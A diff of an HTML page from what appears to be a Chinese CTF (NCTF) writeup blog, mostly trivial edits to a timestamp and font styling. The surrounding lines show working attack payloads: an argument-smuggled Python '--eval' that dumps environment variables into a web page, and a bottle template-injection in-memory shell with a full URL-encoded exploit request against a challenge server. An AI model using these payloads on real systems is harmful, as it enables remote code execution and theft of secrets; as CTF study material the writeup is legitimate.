@@ -20,7 +20,7 @@
 <meta property="og:image" content="https://0wlle0n.github.io/images/cfa3b466208b40f98f176cfee6ef833c.png">
 <meta property="og:image" content="https://0wlle0n.github.io/images/b0158c8c5381acb62141d63991e0505c.png">
 <meta property="article:published_time" content="2025-03-24T15:16:47.000Z">
-<meta property="article:modified_time" content="2025-03-27T12:59:43.023Z">
+<meta property="article:modified_time" content="2025-03-29T14:15:17.476Z">
 <meta property="article:author" content="le0n">
 <meta property="article:tag" content="writeup">
 <meta name="twitter:card" content="summary">
@@ -171,8 +171,8 @@
 <p><img src="/images/0a9568114c177cb2e7a6b2087e0b3553.png"></p>
 <p>实测如果host不存在执行不了，而机器不出网，所以使用127.0.0.1</p>
 <p><code>127.0.0.1 --eval=__import__(&#39;os&#39;).system(&#39;env&gt;/app/index.html&#39;)</code></p>
-<p><font style="color:rgb(0, 0, 0);">nctf{e3e4014b-fa3b-4bf7-b751-9ffd3a7633de}</font></p>
-<h2 id="ez-dash"><a href="#ez-dash" class="headerlink" title="ez_dash"></a><font style="color:rgb(0, 0, 0);">ez_dash</font></h2><p>%exec()能模板注入任意代码执行，没回显我们打内存马</p>
+<p>nctf{e3e4014b-fa3b-4bf7-b751-9ffd3a7633de}</p>
+<h2 id="ez-dash"><a href="#ez-dash" class="headerlink" title="ez_dash"></a>ez_dash</h2><p>%exec()能模板注入任意代码执行，没回显我们打内存马</p>
 <p><code>__import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__[&#39;bottle&#39;].error(404)(lambda e:__import__(&#39;os&#39;).popen(&#39;env&#39;).read())</code></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//39.106.16.204:11883/render?path=aas123%0a%exec(%22__import__(&#x27;sys&#x27;)%22%2Bchr(46)%2B%22modules%5B&#x27;__main__&#x27;%5D%22%2Bchr(46)%2B%22__dict__%5B&#x27;bottle&#x27;%5D%22%2Bchr(46)%2B%22error(404)(lambda%20e%3A__import__(&#x27;os&#x27;)%22%2Bchr(46)%2B%22popen(&#x27;env&#x27;)%22%2Bchr(46)%2B%22read())%22)%0a</span></span><br></pre></td></tr></table></figure>
 
